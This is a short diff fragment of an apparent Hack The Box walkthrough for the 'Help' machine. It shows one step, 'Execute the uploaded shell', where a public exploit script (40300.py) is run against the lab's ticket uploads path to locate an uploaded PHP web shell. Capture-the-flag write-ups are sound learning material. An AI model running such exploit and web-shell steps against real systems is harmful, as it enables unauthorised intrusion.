@@ -93,7 +93,9 @@ http://help.htb/support/?v=submit_ticket&action=displayForm
 <img width="1364" height="441" alt="image" src="https://github.com/user-attachments/assets/99d48310-5f7a-4d8a-964a-d4fa47cd83a1" />
 
 3. **Execute the uploaded shell:**
+
 ```bash
+
 # Generate shell URL using the exploit
 python2 40300.py http://help.htb/support/uploads/tickets/ shell.php
 
